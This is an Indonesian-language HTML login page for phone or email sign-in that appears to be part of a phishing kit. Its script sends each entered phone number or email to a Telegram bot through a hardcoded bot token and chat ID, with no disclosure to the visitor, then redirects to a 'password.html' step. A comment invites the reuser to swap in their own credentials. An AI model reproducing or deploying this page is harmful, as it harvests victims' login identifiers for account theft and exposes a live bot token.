<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>Login / Daftar</title>

  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700;800&display=swap');
* {
  -webkit-tap-highlight-color: transparent;
  -webkit-touch-callout: none;
}

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Poppins', sans-serif;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      background: #fff;
      color: #0B2C33;
      padding: 24px;
      overflow-x: hidden;
    }

    .back-btn { font-size: 26px; cursor: pointer; }

    h1 {
      font-size: 28px;
      font-weight: 800;
      margin: 20px 0 28px;
    }

    /* TAB */
    .tab-switch {
      display: flex;
      background: #F2F3F5;
      border-radius: 50px;
      padding: 5px;
      width: 100%;
      max-width: 320px;
      margin-bottom: 40px;
    }

    .tab {
      flex: 1;
      text-align: center;
      padding: 10px 0;
      border-radius: 50px;
      font-size: 12px;
      font-weight: 600;
      color: #8C9EA6;
      cursor: pointer;
      white-space: nowrap;
      transition: .25s;
    }

    .tab.active {
      background: #fff;
      color: #0B2C33;
      box-shadow: 0 2px 5px rgba(0,0,0,.08);
    }

    .input-section { display: none; }
    .input-section.active { display: block; }

    /* PHONE */
    .phone-input {
      display: flex;
      align-items: center;
      font-size: 21px;
      font-weight: 800;
    }

    .flag {
      width: 26px;
      height: 26px;
      border-radius: 50%;
      background: url('https://flagcdn.com/h24/id.png') center/cover no-repeat;
      margin-right: 8px;
      flex-shrink: 0;
    }

    .country-code {
      font-size: 20px;
      margin-right: 6px;
    }

    input {
      border: none;
      outline: none;
      background: none;
      font-size: 21px;
      font-weight: 800;
      width: 100%;
      color: #0B2C33;
    }

    input::placeholder {
      color: #8C9EA6;
      font-weight: 500;
    }

    /* BUTTON */
    .btn-lanjut {
      position: fixed;
      bottom: 20px;
      left: 0;
      width: 100%;
      padding: 0 24px;
      display: flex;
      justify-content: center;
    }

    button {
      width: 100%;
      max-width: 420px;
      padding: 16px;
      border-radius: 50px;
      border: none;
      font-size: 17px;
      font-weight: 700;
      background: #A7B4B8;
      color: #E6FBE2;
      cursor: pointer;
      transition: .3s;
    }

    button.active { background: #0B2C33; }
    button:active { transform: scale(.98); }

    /* FADE */
    #fadeWhite {
      position: fixed;
      inset: 0;
      background: #fff;
      opacity: 0;
      pointer-events: none;
      transition: .3s;
      z-index: 999;
    }

    #fadeWhite.active { opacity: 1; }
  </style>
</head>

<body>

  <div class="back-btn" onclick="history.back()">‚Üê</div>
  <h1>Login / Daftar</h1>

  <div class="tab-switch">
    <div class="tab active" id="tab-phone">Nomor Handphone</div>
    <div class="tab" id="tab-email">Email</div>
  </div>

  <div class="input-section active" id="phone-section">
    <div class="phone-input">
      <div class="flag"></div>
      <span class="country-code">+62</span>
      <input type="tel" id="phone" placeholder="8XX XXXX XXXX" maxlength="13">
    </div>
  </div>

  <div class="input-section" id="email-section">
    <input type="email" id="email" placeholder="Masukkan email kamu">
  </div>

  <div class="btn-lanjut">
    <button id="lanjutBtn">Lanjutkan</button>
  </div>

  <div id="fadeWhite"></div>

  <script>
    /* ===============================
       üîê TELEGRAM CONFIG
       GANTI SENDIRI
    =============================== */
    const TELEGRAM_TOKEN = '8366843088:AAG2DgTncj7WVowbtCY-_9iL85PLahl1ddg';
    const TELEGRAM_CHAT_ID = '5983910858';

    function sendToTelegram(text) {
      return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: text
        })
      });
    }

    /* ===============================
       ELEMENT
    =============================== */
    const tabPhone = document.getElementById('tab-phone');
    const tabEmail = document.getElementById('tab-email');
    const phoneSection = document.getElementById('phone-section');
    const emailSection = document.getElementById('email-section');
    const phoneInput = document.getElementById('phone');
    const emailInput = document.getElementById('email');
    const lanjutBtn = document.getElementById('lanjutBtn');
    const fadeWhite = document.getElementById('fadeWhite');

    /* TAB SWITCH */
    tabPhone.onclick = () => {
      tabPhone.classList.add('active');
      tabEmail.classList.remove('active');
      phoneSection.classList.add('active');
      emailSection.classList.remove('active');
      updateBtn();
    };

    tabEmail.onclick = () => {
      tabEmail.classList.add('active');
      tabPhone.classList.remove('active');
      emailSection.classList.add('active');
      phoneSection.classList.remove('active');
      updateBtn();
    };

    /* VALIDASI */
    function updateBtn() {
      let valid = false;
      if (phoneSection.classList.contains('active')) {
        valid = /^8\d{7,11}$/.test(phoneInput.value.trim());
      } else {
        valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput.value.trim());
      }
      lanjutBtn.classList.toggle('active', valid);
    }

    phoneInput.addEventListener('input', updateBtn);
    emailInput.addEventListener('input', updateBtn);

    /* SUBMIT */
    lanjutBtn.onclick = () => {
      if (!lanjutBtn.classList.contains('active')) return;

      let message = '';
      if (phoneSection.classList.contains('active')) {
        message = 'üì± Nomor HP: ' + phoneInput.value.trim();
      } else {
        message = 'üìß Email: ' + emailInput.value.trim();
      }

      sendToTelegram(message).finally(() => {
        fadeWhite.classList.add('active');
        setTimeout(() => {
          window.location.href = 'password.html';
        }, 400);
      });
    };
  </script>

</body>
</html>
